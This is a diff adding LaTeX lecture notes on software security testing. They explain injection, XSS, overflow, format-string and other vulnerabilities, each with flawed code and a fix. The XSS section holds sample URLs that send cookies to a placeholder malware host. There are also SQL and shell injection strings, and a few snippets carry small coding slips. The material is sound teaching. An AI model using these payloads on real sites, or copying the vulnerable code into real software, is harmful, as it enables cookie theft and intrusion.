@@ -1,0 +1,2386 @@
+\documentclass[a4paper, 10pt, titlepage]{article}
+\usepackage[T1]{fontenc}
+\usepackage[utf8]{inputenc}
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{amsthm}
+\usepackage[makeroom]{cancel}
+\usepackage{ulem}
+\usepackage{parcolumns}
+\usepackage{multicol}
+\setlength{\columnseprule}{0.4pt}
+\usepackage{lipsum}
+\usepackage{graphicx}
+\usepackage[dvipsnames]{xcolor}
+\usepackage{hyperref}
+\usepackage{enumitem}
+\usepackage[T1]{fontenc}
+\usepackage[margin=3cm]{geometry}
+\usepackage{booktabs}
+\usepackage{fancyhdr}
+\usepackage{tikz}
+\usetikzlibrary{calc}
+\usepackage{listings}
+\lstset{
+	inputencoding=utf8,
+	basicstyle=\ttfamily,
+	tabsize=4,
+	showstringspaces=false,
+	literate={à}{{\`a}}1
+}
+\usepackage{fancyvrb}
+\pagestyle{fancy}
+\lhead{\nouppercase{\leftmark}}
+\rhead{\nouppercase{\rightmark}}
+
+\setcounter{topnumber}{8}
+\setcounter{bottomnumber}{8}
+\setcounter{totalnumber}{8}
+
+%TABLE OF CONTENTS
+\setcounter{tocdepth}{1}
+\usepackage{tocstyle}
+
+\begin{document}
+
+\title{Security Testing}
+\author{Edoardo Righi}
+\maketitle
+\thispagestyle{empty}
+\tableofcontents
+\newpage
+\part{THEORY}
+	
+\newpage
+\section{Attack taxonomy}
+\begin{itemize}
+\item \textbf{Vulnerability}: the state of being open to attack or damage
+\item \textbf{Exploit}: take advantage of a weakness (vulnerability)
+\end{itemize}
+\subsection*{Attacks}
+Security mistakes are very easy to make and a simple one-line error can be catastrophic. No programming language or platform can make the software secure: this is the programmer’s job!
+	
+\subsection{SQL Injection}
+It is a type of attack that exploit the possibility to add SQL code into a user input; the user provided data is used to form a SQL query that the server executes. An example with PHP:
+\begin{lstlisting}
+	$id = $_GET["id"];
+	$query = "SELECT * FROM customers WHERE id =" . $id;
+	$result = mysql_query($query);
+\end{lstlisting}
+Usually the query is used so that the output is like:
+\begin{lstlisting}
+	SELECT * FROM customers WHERE id = 1;
+\end{lstlisting}
+However, the query could also become:
+\begin{lstlisting}
+	SELECT * FROM customers WHERE id = 1 OR 2>1
+	SELECT * FROM customers WHERE id = 1; UPDATE accout...
+	SELECT * FROM customers WHERE id = 1; DROP accout ...
+\end{lstlisting}
+In the first case the user includes a \lstinline|OR| operator with an expression that is always true, so that all the IDs will be selected. In the other 2 cases a semicolon ends the statement and enables the user to initiate a new query. 
+
+\subsubsection*{Fix}
+A fix can be made by limiting the types of characters accepted and/or the length of the input:
+\begin{lstlisting}
+	$id = $_GET["id"];
+	if (preg_match('^\d{1,8}$', $id)) {
+		$query = "SELECT name FROM customers WHERE id =" . $id;
+		...
+\end{lstlisting}
+This way it accepts a \lstinline|$id| that contains digits only and has length between 1 to 8. After PHP 5.0 it is possible to use the prepare method:
+\begin{lstlisting}
+	$stmt = mysqli_prepare($db,
+			"SELECT ccnum FROM cust WHERE id = ?");
+	$id = $_GET["id"];
+	mysqli_stmt_bind_param($stmt, 'i', $id);
+	...
+\end{lstlisting}
+'i' specifies we are expecting an integer input, '?' will be replaced by the integer input. Only if the final statement matches the structure we specified in the prepare statement, it will be valid.
+
+\subsubsection*{Affected languages}
+All programming languages that interface with a database: Perl, Python, Java, web languages (ASP, ASP.NET, JSP, PHP), C\#, VB.NET. Also low level languages (C, C++) might be compromised as well and SQL is of course vulnerable (e.g., stored procedures).
+
+
+
+\subsection{Cross Site Scripting (XSS)}
+It is a vulnerability that enables to insert or execute in a form input (client side) an attack: execute malware, steal data or cookies. The problem is caused by the direct displaying in an output web page, without any sanitization.
+\begin{lstlisting}
+	<?php
+		$query = $_GET["query"];
+		if (isset($query)) {
+			echo "Search results for: " . $query;
+			// perform query and echo query results
+		}
+	?>
+\end{lstlisting}
+For example, a search of "Q-bits" in an input form returns the HTML page:
+\begin{lstlisting}
+	<html>
+		Search results for: Q-bits
+		<ol>
+			<li> http://qbits.com/ </li>
+			<li> http://qbits.edu/ </li>
+			<li> http://q.bits.it/ </li>
+		...
+\end{lstlisting}
+It is then possible to send the link hiding the full URL with a mail:
+\begin{center}
+\includegraphics[scale=0.25]{img/st1.png}
+\end{center}
+It is however also possible to alter the content of the URL like:
+\begin{lstlisting}
+http://search.com/?query=<a href="http://malware.com/virus.exe">
+		Q-bits</a>
+\end{lstlisting}
+So that, when the link is pressed, the actual page to whom the user is redirected is the malicious site set by the attacker. Same thing can be made to steal cookies or to execute a script:
+\begin{lstlisting}
+http://search.com/?query=<a href="#" onclick="document.location=
+	'http://malware.com/stealcookie.php?cookie='
+		+escape(document.cookie);" >Q-bits</a>
+\end{lstlisting}
+\begin{lstlisting}
+http://search.com/?query=<script>document.write(
+	'<img src="https://malware.com/steal-cookie.gif?cookie='
+		+escape(document.cookie)+'">');</script>Q-bits
+\end{lstlisting}
+Typical attack:
+\begin{enumerate}
+\item The attacker identifies a web site with XSS vulnerabilities;
+\item The attacker creates a URL that submits malicious input (e.g.,
+including malicious links or JS code) to the attacked web site;
+\item The attacker tries to induce the victim to click on the URL (e.g., including link in an email);
+\item The victim clicks the URL, hence submitting malicious input to
+the attacked web site;
+\item The web site response page includes malicious links or
+malicious JS code (executed on the victim’s browser).
+\end{enumerate}
+\subsubsection*{Fix}
+As with the SQL Injection, this attack can be avoided by checking the input, manually or using the safe functions of the languages (\lstinline|htmlentities| for PHP).	
+\begin{lstlisting}
+	if (isset($query) &&
+			preg_match('/^[\&\|\(\)\w\s]{3,30}$/', $query)) {
+		echo "Search results for: $query";
+\end{lstlisting}
+\begin{lstlisting}
+	if (isset($query)) {
+		$query = htmlentities($query);
+		echo "Search results for: $query";
+\end{lstlisting}
+Sanitize any user input which might reach output statements (including statements that write to a database or that save cookies).
+
+\subsubsection*{Affected languages}
+All programming languages used to build a web site are affected.
+	
+\subsection*{Call stack}
+The call stack is a stack data structure that stores information about the active subroutines of a computer program. The call stack grows to lower memory addresses.
+\begin{itemize}
+	\item \textbf{ebp}: register pointing to the base (highest address) of the current invocation frame (aka \textbf{fp}) 
+	\item \textbf{esp}: register pointing to top of stack (lowest address) 
+	\item \textbf{eip}: register pointing to the instruction to be executed next
+\end{itemize} \medskip
+\begin{minipage}{0.35\textwidth}
+\includegraphics[scale=0.23]{img/stack1.png}
+\end{minipage} \hfill
+\begin{minipage}{0.6\textwidth}
+\begin{verbatim}
+	call: f(x1, x2, x3);
+\end{verbatim}
+\begin{enumerate}
+\item The 3 params are saved to the stack
+\item Return address (\textbf{eip} of \textbf{ebp}+ 4) is saved to the stack 
+\item \textbf{ebp} of previous frame is saved to the stack
+\item Local variables are pushed to the stack
+\end{enumerate}
+\end{minipage}\medskip
+	
+\begin{minipage}{0.32\textwidth}
+\includegraphics[scale=0.2]{img/stack2.png}
+\end{minipage} \hfill
+\begin{minipage}{0.6\textwidth}
+\begin{verbatim}
+	return: f(x1, x2, x3);
+\end{verbatim}
+\begin{enumerate}
+\item Local variables are popped from the stack
+\item ebp of previous frame is restored from the stack
+\item Return address is assigned to eip 
+\end{enumerate}
+\end{minipage}
+
+\subsection{Buffer overflow}
+It stands for the attempt to write more data to a fixed length memory block.
+	
+\begin{minipage}{0.6\textwidth}
+\begin{lstlisting}
+	#include <stdio.h>
+	void f(char* input) {
+		char buf[16];
+		strcpy(buf, input);
+		printf("%s\n", buf);
+	}
+	int main(int argc, char* argv[]) {
+		f(argv[1]);
+		return 0;
+	}
+\end{lstlisting}
+\end{minipage}
+\begin{minipage}{0.3\textwidth}
+\includegraphics[scale=0.25]{img/stack3.png}
+\end{minipage}\bigskip \\ 
+\begin{minipage}{0.45\textwidth}
+\begin{verbatim}
+	> a.out "hello"
+\end{verbatim} \medskip
+\includegraphics[scale=0.25]{img/stack4.png}
+\end{minipage}
+\begin{minipage}{0.45\textwidth}
+\begin{verbatim}
+	> a.out "abcdefghijklmnopxxxxyyyy"
+\end{verbatim} \medskip
+\includegraphics[scale=0.25]{img/stack5.png}
+\end{minipage} \medskip\\
+With as input \lstinline|> a.out "HELLO"|, there is no problem as the character occupy 6 chars (ending char included) of the 16 available. But if the input is \lstinline|> a.out "abcdefghijklmnopxxxxyyyy"|, things are different. The string is 24 characters long, so \lstinline|xxxxyyyy| goes out of the buffer:
+\begin{itemize}
+\item \textbf{strcpy} continues copying until it finds \lstinline|'\0'|
+\item \textbf{eip} can then point to arbitrary address
+\item Value of other local variables can be changed
+\end{itemize}
+Instead of “abcd...”, the attacker can input executable code in HEX, called shellcode. \medskip\\
+To sum it up, the problem is that user data and control flow information (e.g., function pointer tables, return addresses) are mixed together on the stack and on the heap, hence user data exceeding a buffer may corrupt control flow information. How to spot it? The use of unsafe string manipulation functions (e.g., strcpy) is a wake-up call of it. 
+
+\subsubsection*{Fix}
+\begin{itemize}
+\item Use counted versions of string functions
+\item Use safe string libraries, if available, or C++ strings
+\item Check loop termination and array boundaries
+\item Use C++/STL containers instead of C arrays
+\end{itemize}
+
+\subsubsection*{More examples}
+\begin{lstlisting}
+	void f() {
+		char buf[20];
+		gets(buf);
+	}
+\end{lstlisting}
+Use \textbf{fgets} instead of \textbf{gets}: \lstinline|fgets(buf, 20, stdin);|.
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+		char buf[20];
+		char prefix[] = "http://";
+		strcpy(buf, prefix);
+		strncat(buf, path, sizeof(buf));
+\end{lstlisting}
+Since there is a prefix, it should be: \lstinline|sizeof(buf)-7|.
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+		char buf[20];
+		sprintf(buf, "%s - %d\n", path, errno);
+\end{lstlisting}
+Use \textbf{snprintf} instead of \textbf{sprintf}.
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+		char buf[20];
+		strncpy(buf, data, strlen(data));
+\end{lstlisting}
+Should be the size of \textbf{buf}, 20.
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+		char src[10];
+		char dest[10];
+		char* base_url = "www.fbk.eu";
+		strncpy(src, base_url, 10);
+		strcpy(dest, src);
+\end{lstlisting}
+The string \textbf{base\_url} is 11 chars long because of the '\lstinline|\0|' at the end of the string, so \textbf{src} will not be null terminated. We will have buffer overflow because \textbf{strcpy} doesn’t know when to stop.
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+		wchar_t wbuf[20];
+		_snwprintf(wbuf, sizeof(wbuf), "%s\n", input);
+\end{lstlisting}
+Should be half (for 32 bit systems) the size of wbuf.
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+	void f(File* f, unsigned long count) {
+		unsigned long i;
+		p = new Str[count];
+		for (i = 0 ; i < count ; i++) {
+			if (!ReadFile(f, &(p[i])))
+				break;
+		}
+	}
+\end{lstlisting}
+With count coming from user input. 
+$$\text{\lstinline|new Str[count]| }\rightarrow \text{\lstinline|malloc(sizeof(Str) * count)|}$$
+Multiplication may overflow, causing insufficient memory allocation (integer overflow, we will see later).\textbf{ Allocation should be guarded to ensure count is not too big.}
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+	void f(char* input) {
+		short len; // 16 bits
+		char buf[MAX_BUF];
+		len = strlen(input);
+		if (len < MAX_BUF)
+			strcpy(buf, input);
+	}
+\end{lstlisting}
+If \textbf{input} is longer than 32K, \textbf{len} will be negative, hence lower than \textbf{MAX\_BUF}. If \textbf{input} is longer than 64K, \textbf{len} will be a small positive, possibly lower than \textbf{MAX\_BUF}. Use \textbf{size\_t} instead of \textbf{short}. \medskip
+\subsubsection*{Affected languages}
+\begin{itemize}
+\item \textbf{C}, \textbf{C++}, \textbf{Assembly} and low level languages
+\item Unsafe sections of \textbf{C\#}
+\item High level languages (e.g., \textbf{Java}) implemented in \textbf{C/C++}
+\item High level languages interfacing with the OS (almost certainly
+written in \textbf{C/C++})
+\item High level languages interacting with external libraries written in \textbf{C/C++}
+\end{itemize}
+\newpage
+\subsection{Format string}
+String arguments for Format Functions like printf contain Format String parameters like \%d, \%s.
+\begin{lstlisting}
+	printf("Hello %s, your age is %d", name, age);
+\end{lstlisting}
+To add the value of \lstinline|name| to \lstinline|%s|, the system executes a POP from a certain memory area. For example:\\
+\begin{minipage}{0.7\textwidth}
+\begin{lstlisting}
+	int main(int argc, char* argv[]) {
+		if (argc > 1)
+			printf(argv[1]);
+		return 0;
+	}
+\end{lstlisting}
+\end{minipage}
+\begin{minipage}{0.25\textwidth}
+\includegraphics[scale=0.3]{img/st2.png}
+\end{minipage}
+
+\begin{verbatim}
+> a.out "hello"
+hello
+\end{verbatim}
+But with:
+\begin{verbatim}
+> a.out "%x %x"
+12ffc0a0 4011e5a1
+\end{verbatim}
+The system POP two values from the call stack and prints them (in hex format).
+\begin{itemize}
+\item "\%d \%d" pops two integers in decimal format
+\item "\%c \%c" pops two characters
+\item "\%p \%p" pops two pointers in hexadecimal format
+\item "\%10\$d" pops the $10^{th}$ integer
+\end{itemize}
+Moreover, with:
+\begin{verbatim}
+> a.out "%d%n\n"
+%1234d%n
+\end{verbatim}
+1234 is written into the memory location 4011e5a1. \medskip\\
+\textbf{Problem}: a tainted string may be used as a format string, hence the attacker can insert formatting instructions that pop (e.g., \%s, \%x) values from the stack or write (e.g., \%n) values onto the call stack/heap. This is possible if the formatting function has an undeclared number of parameters. 
+
+\subsubsection*{Fix}
+\begin{itemize}
+\item Use constant strings as string formats whenever possible
+\item Sanitize user input before using it as a format string
+\begin{lstlisting}	
+	int main(int argc, char* argv[]) {
+		if (argc > 1)
+			printf("%s", argv[1]);
+		return 0;
+	}
+\end{lstlisting}
+\item Avoid formatting functions of the printf family (e.g., use stream operator << in C++)
+\end{itemize}
+If user input can appear in the error message, the attack can be
+mounted:
+\begin{lstlisting}
+	fprintf(STDOUT, err_msg);	-->	fprintf(STDOUT,"%s", err_msg)
+\end{lstlisting}
+
+\subsubsection*{Affected languages}
+\begin{itemize}
+\item \textbf{C}, \textbf{C++}, \textbf{Perl}: languages supporting format strings, that can be provided externally, and variable number of arguments, which are obtained from the call stack without any check;
+\item High level languages that use C implementations of their string
+formatting functions.
+\end{itemize}
+\newpage
+
+\subsection{Integer overflow}
+This vulnerability is based on arithmetical specifications of calculators. In the C language there are different types of integers, defined by variables with specific bits. For example on a 32bit machine:
+\begin{itemize}
+\item \textbf{int} is an integer with 32 bits;
+\item \textbf{short} is an integer with 16 bits.
+\end{itemize}
+A \textbf{short} integer can store 65,536 distinct values. In an unsigned representation, these values are the integers between 0 and 65,535; using two's complement, possible values range from -32,768 to 32,767.
+An implicit or explicit integer type conversion, or an integer operation, can produce unexpected results due to truncation or bit extension: overflow.
+\begin{lstlisting}
+	int MAX = 32767000;
+	int main(int argc, char* argv[]) {
+		short len = MAX;
+		char s[len+2000];
+		strncpy(s, argv[1], 32769000);
+	}
+\end{lstlisting}
+The downcast truncates \textbf{MAX} and the sign bit becomes 1:
+\begin{verbatim}
+len = -1000
+char s[len+2000]; // s[1000]
+\end{verbatim}
+Also using functions (\lstinline|strlen| returns integer):
+\begin{lstlisting}
+	short len = strlen(argv[1]);
+	if (len < 0) {
+		printf(err_msg);
+		abort();
+	}
+\end{lstlisting}
+When argv has more than 32K characters, the downcast makes \lstinline|len| negative.
+
+\subsubsection*{Fix}
+\begin{itemize}
+\item Use large enough integer types, unsigned integers if possible;
+\item Do not mix signed and unsigned integers in operations;
+\item Check explicitly that expected boundaries are not exceeded;
+\item Use \textbf{size\_t} for data structure and array size (guaranteed to be able to hold the size of any data object that the particular C implementation can create).
+\end{itemize}
+
+\subsubsection*{More examples}
+\begin{lstlisting}
+	void f() {
+		short x = -1;
+		unsigned short y = x;
+	}
+\end{lstlisting}
+y is positive (y = 65535).
+\\\noindent\rule{10cm}{0.4pt}
+
+\begin{lstlisting}
+	void f(){
+		unsigned short x = 65535;
+		short y = x;
+	}
+\end{lstlisting}
+y is negative (y = -1).
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+	void f() {
+		unsigned char x = 255;
+		x = x + 1; 			// x == 0
+		x = 2 - 3; 			// x == 255
+		char y = 127;
+		y = y + 1; 			// y = -128
+		y = -y				// y = -128
+		short z1 = 32000;
+		short z2 = 32000;
+		short z = z1 + z2; 	// z == -1536
+		z = z1 * z2;		// z == 0
+	}
+\end{lstlisting}
+Explicitly check that operands are within the boundaries of the operators (e.g., $z1 < 182$ and $z2 < 182$).
+\begin{lstlisting}
+	int main(int argc, char* argv[]) {
+		short len = strlen(argv[1]);
+		char* s;
+		if (len < 0)
+			len = -len;
+		s = malloc(len);
+		strncpy(s, argv[1], len);
+	}
+\end{lstlisting}
+Crashes if length of argv[1] = 32768 (max short +1). This is caused by the fact that the \textbf{len} value is a short integer, so it is converted to -32768, it enters the if clause and gets converted again to +32768; but again this number can not be stored in a short and becomes -32768. Crash! \medskip
+
+\subsubsection*{Affected languages}
+\begin{itemize}
+\item \textbf{C}, \textbf{C++}
+\item \textbf{C\#} checks for integer overflows and throws exceptions when these happen; however, programmers can define unchecked code blocks
+\item \textbf{Java}: overflow and underflow is not checked in any way; division by zero is the only numeric operation that throws an exception; however, unsigned types are not supported in Java and downcast is explicit
+\item \textbf{Perl} promotes integer values to floating point, which may produce unexpected results, when the result is used in an integer
+context (e.g., in a printf statement with \%d format)
+\end{itemize}
+Languages (e.g., \textbf{C\#}) and programs (e.g., in \textbf{Java}) that check for overflows and raise exceptions when these happen are anyway exposed to denial of service attacks.
+
+\newpage
+\subsection{Command Injection}
+\textbf{Problem}: untrusted user data is passed to an interpreter (or compiler); if the data is formatted so as to include commands the interpreter understands, such commands may be executed and the interpreter might be forced to operate beyond its intended functions.
+\begin{lstlisting}
+	void main(int argc, char* argv[]) {
+		char buf[1024];
+		snprintf(buf, sizeof(buf)-1, "lpq -P %s", argv[1]);
+		system(buf);
+	}
+\end{lstlisting}
+With input:
+\begin{verbatim}
+> a.out "PR0"
+\end{verbatim}
+The output gives informations about the printer \lstinline|PR0|, as requested.
+It is possible however to concatenate this command with a malicious one, using semicolon as separator:
+\begin{verbatim}
+lpq -P PR0 ; xterm&
+\end{verbatim}
+In this case, after the previous command, the \lstinline|xterm| command is executed, which is terminated by the control operator \lstinline|&|: the shell executes the command in the background in a subshell, returning the shell job ID (surrounded with brackets) and process ID.
+
+\subsubsection*{Fix}
+\begin{lstlisting}
+		char buf[1024];
+		if (strchr(argv[1], ';') == NULL && // separate cmds
+				strchr(argv[1], '|') == NULL && // pipe output
+				strchr(argv[1], '`') == NULL && // output of cmd
+				strchr(argv[1], '&') == NULL){// run in background
+			snprintf(buf, sizeof(buf)-1, "lpq -P %s", argv[1]);
+			system(buf);
+		}
+\end{lstlisting}
+Use blacklist of shell special characters to validate user input.
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+		regex_t r;
+		regmatch_t m[1];
+		regcomp(&r, "^[a-zA-Z0-9\\.]*$", 0);
+		if (regexec(&r, argv[1], 1, m, 0) == 0) {
+			snprintf(buf, sizeof(buf)-1, "lpq -P %s", argv[1]);
+			system(buf);
+		}
+\end{lstlisting}
+Similar to SQL injection mitigation, allow only certain characters.
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+		snprintf(buf, sizeof(buf)-1, "lpq -P \"%s\"", argv[1]);
+		system(buf);
+\end{lstlisting}
+Quotes ensure the entire argv[1] is passed as argument to \lstinline|lpq -P|:
+\begin{Verbatim}[tabsize=4]
+> a.out PR0 | less			lpq -P "PR0 | less"
+\end{Verbatim}
+Command \lstinline|lpq| will try to query details of device \textbf{"PR0 | less"}. \medskip\\
+What if \lstinline|argv[1]| was \lstinline|PR0"; ls; echo "Hello!| ?
+\begin{verbatim}
+lpq –P "PR0"; ls; echo "Hello!"
+\end{verbatim}
+Make sure that \lstinline|argv[1]| does not contain quotes inside!
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+		char *cmd = "lpq";
+		char *args[] = {"-P", argv[1], (char*)NULL};
+		execvp(cmd, args);
+\end{lstlisting}
+The command is executed without invoking any shell (hence, no
+shell interpreter is run)
+\begin{Verbatim}[tabsize=4]
+> a.out PR0 | less			lpq –P “PR0 | less”
+\end{Verbatim}
+For any input passed in \lstinline|argv[1]|, only command \lstinline|lpq| is executed. \bigskip\\
+To recap, the main methods used are:
+\begin{itemize}
+\item \textbf{Deny-list}: user data including characters in a deny list are rejected (not interpreted);
+\item \textbf{Allow-list}: only user data matching the character patterns in the allow list are interpreted;
+\item \textbf{Quoting}: user data are transformed (e.g., embedded within quotes) so as to avoid them being interpreted as commands.
+\end{itemize}
+
+\subsubsection*{More examples}
+\begin{lstlisting}
+	def call_func(system_data, user_input):
+		exec 'special_func_%s("%s")' % (system_data, user_input)
+\end{lstlisting}
+Based on \lstinline|system_data|, choose the function to call passing the \lstinline|user_input|. \\
+For example if:
+\begin{verbatim}
+system_data = sample
+user_input = fred
+\end{verbatim}
+Python would run the following:
+\begin{verbatim}
+special_function_sample("fred")
+\end{verbatim}
+Instead if:
+\begin{verbatim}
+system_data = sample
+user_input = fred"); print("foo
+\end{verbatim}
+Python would run the following:
+\begin{verbatim}
+special_function_sample("fred"); print("foo")
+\end{verbatim}
+\lstinline|user_input| should be validated (with deny-allow lists) before being passed to the \lstinline|exec| instruction.
+
+\subsubsection*{Affected languages}
+Any programming language used to implement an interpreter for user provided data, which might include unintended commands:
+\begin{itemize}
+\item C/C++: system, popen, execlp, execvp, \_wsystem;
+\item Perl: system, exec, `, open, |, eval, /e in regexp;
+\item Python: exec, eval, os.system, os.open, execfile, input, compile;
+\item Java: Class.forName, Class.newInstance, Runtime.exec;
+\item PHP: system, exec, shell\_exec, passthru.
+\end{itemize}
+In general, if you see:
+\begin{itemize}
+\item commands and data are placed inline (e.g., "cat \$filename");
+\item if special characters can change the data into a command (e.g., ';');
+\item  and then if this control of commands gives users more privilege than they have, then we have command injection vulnerability.
+\end{itemize}
+
+\newpage
+\subsection{Error handling}
+\textbf{Problem}: the software does not handle some error conditions, leaving the program in an unsecure state, which might eventually produce a crash (hence, potentially a denial of service), possibly accompanied by disclosure of sensitive information about the code itself (when inappropriate error messages propagate to the end user).
+
+\begin{lstlisting}
+	DWORD f(char* szFilename) {
+		FILE* f = fopen(szFilename, "r");
+		// read data from f
+		fclose(f);
+		return 1;
+	}
+\end{lstlisting}
+If the attacker can make \lstinline|szFilename| an invalid file name, \lstinline|f| will be NULL and this function will use a null pointer to perform file operations, hence it will crash, causing potentially:
+\begin{itemize}
+\item Denial of service (e.g., the server process dies);
+\item Disclosure of program and system’s internals (e.g., server's directory structure), depending on the error messages reportedcto the end user.
+\end{itemize}
+
+\subsubsection*{Fix}
+\begin{lstlisting}
+	DWORD f(char* szFilename) {
+		FILE* f = fopen(szFilename, "r");
+		if (f == NULL)
+			return ERROR_FILE_NOT_FOUND;
+		// read data from f
+		fclose(f);
+		return 1;
+	}
+\end{lstlisting}
+Error return values are there for a reason. They indicate failure
+conditions so that calling functions can react accordingly.
+\begin{itemize}
+\item Server programs cannot just terminate (DoS), instead should react to the failure;
+\item Non server programs can terminate on failure.
+\end{itemize}
+
+\subsubsection*{More examples}
+\begin{lstlisting}
+	try {
+		// open XML file, get URI  and make request
+	} catch
+		// do nothing
+	}
+\end{lstlisting}
+The error is masked, and we don’t know what really happend. At least the following exceptions should be caught and handled separately:
+IOException, FileNotFoundException, XmlException, SecurityException, SocketException.
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+	try {
+		struct BigThing {
+			double _d[16999];
+		};
+		BigThing* p = new (std::nothrow) BigThing[14999];
+		// use p
+	} catch(std::bad_alloc& e) {
+		// handle allocation problem
+	}
+\end{lstlisting}
+Allocation errors are masked, due to the use of \lstinline|std::nothrow|. If new fails, catch branch won't be executed as we are using \lstinline|std::nothrow|. Use of p will then cause crash of the program.
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+	try {
+		CString str = new CString(szLongString);
+		// use str
+	} catch(std::bad_alloc& e) {
+		// handle allocation problem
+	}
+\end{lstlisting}
+The code is expecting to catch \lstinline|bad_alloc|. CString constructors throw CMemoryException, not \lstinline|bad_alloc|.
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+	char dest[19];
+	char* p = strncpy(dest, szBuf, 19);
+	if (p) {
+		// copy worked fine, let's proceed
+	}
+\end{lstlisting}
+The value returned by strncpy is a pointer to the start of dest
+reglardless of the outcome of the copy operation. The developer thinks the return value of strncpy is NULL on error. Therefore, the check if (p) is useless (there is not enough space for the string ending char).
+\\\noindent\rule{10cm}{0.4pt}
+\begin{lstlisting}
+	ImpersonateNamedPipeClient(hPipe);
+	DeleteFile(szFileName);
+	RevertToSelf();
+\end{lstlisting}
+A server receiving a request from a client switches its security context to the client and performs the action as the client. If the Impersonate function fails, the error should be caught and handled, so as to avoid deleting a file without having the privileges to do it.
+\begin{lstlisting}
+	if (ImpersonateNamedPipeClient(hPipe) != 0) {
+		// we have the client's security context here
+		DeleteFile(szFileName);
+		RevertToSelf();
+	}
+\end{lstlisting}
+
+\subsubsection*{Affected languages}
+\begin{itemize}
+\item Any programming language that uses function error return values: C, C++, ASP, PHP. 
+\item Any programming language that relies on exceptions: C++, C\#, VB.NET, Java, PHP
+\end{itemize}
+
+
+\newpage
+\subsection{Network traffic}
+\begin{itemize}
+\item \textbf{Eavesdropping}: listen and/or record conversation e.g., login;
+\item \textbf{Replay}: send collected data back e.g., authentication details;
+\item \textbf{Spoofing}: mimic as if data came from one of the parties;
+\item \textbf{Tampering}: modifying data on the network;
+\item \textbf{Hijacking}: cut one party out, continue conversation with the other.
+\end{itemize}
+\textbf{Problem}: the network protocol used by the application is not secure (e.g., SMTP/POP3/IMAP without SSL) and the attacker can intercept, understand and change the data communicated over the network, including authentication and sensitive data.
+
+\subsubsection*{Fix}
+Always use secure protocols such as SSL/TLS Kerberos for any network connection:
+\begin{itemize}
+\item Public key cryptography (e.g., certicates, key)
+\item Symmetric key cryptography (e.g., passwords)
+\end{itemize}
+
+\subsection{Hidden form fields and magic URLs}
+\begin{lstlisting}
+	<form action="buy.php">
+	<input type="hidden" name="manufacturer" value="BMW" />
+	<input type="hidden" name="model" value="545" />
+	<input type="hidden" name="price" value="10000" />
+	<button type="submit" value=" Shop ">Shop</button>
+	</form>
+\end{lstlisting}
+Passing potentially important data from the web app to the client hoping the user doesn’t see it or modify it is really dangerous. A malicious user can easily modify the hidden form fields and send a request to the web app.\medskip\\
+Another example can be the use of GET requests in the wrong situation, like:
+\begin{lstlisting}
+	http://www.mydocs.com/?id=cGFzc3dvcmQ==
+\end{lstlisting}
+"cGFzc3dvcmQ==" is "password" in base64 encoding. Sensitive information is being transferred via URL, an attacker sniffing over the network could collect the sensitive data (e.g., poorly encrypted password). \medskip\\
+\textbf{Problem}: a web application relies on hidden form fields or magic URL parameters to transmit sensitive information. If we see a web app:
+\begin{itemize}
+\item reading from a form or a URL
+\item the data is used to make security, trust or authentication decision
+\item and the communication was via insecure or untrusted channel then the web app could potentially be vulnerable
+\end{itemize}
+
+\subsubsection*{Fix}
+\begin{itemize}
+\item Use a secure channel (https) to exchange sensitive information.
+\item Add a hashed message authentication code (HMAC) to protect the integrity of hidden field values with a key stored on the server:
+\begin{lstlisting}
+	<input type="hidden" name="manufacturer" value="BMW" />
+	<input type="hidden" name="model" value="545" />
+	<input type="hidden" name="price" value="10000" />
+	<input type="hidden" name="HMAC" value="x83ffrtyVVAAa34" />	
+\end{lstlisting}
+\end{itemize}
+
+
+\subsection{Improper use of SSL and TLS}
+\begin{itemize}
+\item The certification authority signing the certificate is not validated (if it’s a root CA);
+\item If it is not signed by a root CA, it is not checked if the chain of signatures lead back to a root CA;
+\item The time validity of the certificate is not checked (expired?);
+\item The domain name of the certificate is not checked if it is the same as the server not of an attacker controlled domain;
+\item The certificate is not checked against the certificate revocation list (could have been revoked for some reason).
+\end{itemize} \medskip
+\textbf{Problem}: while authentication checks are mandatory in the https protocol, if programmers use low level SSL/TLS libraries directly, they might forget some important authentication check, eventually accepting invalid certificates from malicious users.
+\subsubsection*{Fix}
+Programmers using low level SSL/TLS libraries directly might forget some important authentication checks:
+\begin{itemize}
+\item Validate the certification authority
+\item Verify the integrity of the certification authority
+signature
+\item Check the time validity of the certificate
+\item Check the domain name in the certificate
+\item Consult the certificate revocation list
+\end{itemize}
+
+\subsection{Weak passwords}
+\textbf{Problem}: the system does not adopt all appropriate measures to ensure passwords are not easily stolen or guessed.
+\subsubsection*{Fix}
+\begin{itemize}
+\item Enforce strong passwords, check them using password cracking tools (e.g., CrackLib);
+\item Use secure channel and protocol;
+\item Adopt strong password-reset procedures (questions, secure delivery, extra authentication, etc.);
+\item Restrict the login attempts without denying the service, increasing the response time when more login fails occur. Blacklist IP addresses and alert the user (maybe asking her to change password) if too many login attempts occur;
+\item Store encrypted passwords, in secure persistent memory: use PBKDF2 as defined in the public key cryptography standard (PKC5)
+to hash the password into the persistently stored value (validator);
+\item Consider strong protection (multi factor authentication, one-time passwords) for critical applications.
+\end{itemize}
+
+\subsection{Data storage}
+Wrong read/write permissions (e.g., world-writable) granted
+to:
+\begin{itemize}
+\item Executables (e.g., scripts)
+\item Configuration files (e.g., including PATH info)
+\item Database files
+\end{itemize}
+\begin{lstlisting}
+	<?php
+		$db = mysql_connect("localhost", "root", "asd");
+		mysql_select_db("Shipping", $db);
+		// ...
+		$id = $_GET["id"];
+		$query = "SELECT ccnum FROM cust WHERE id = $id";
+		$result = mysql_query($query, $db);
+		for ($i = 0; $i < mysql_num_rows(); $i++)
+			echo mysql_result($result, $i, "ccnum");
+	?>
+\end{lstlisting}
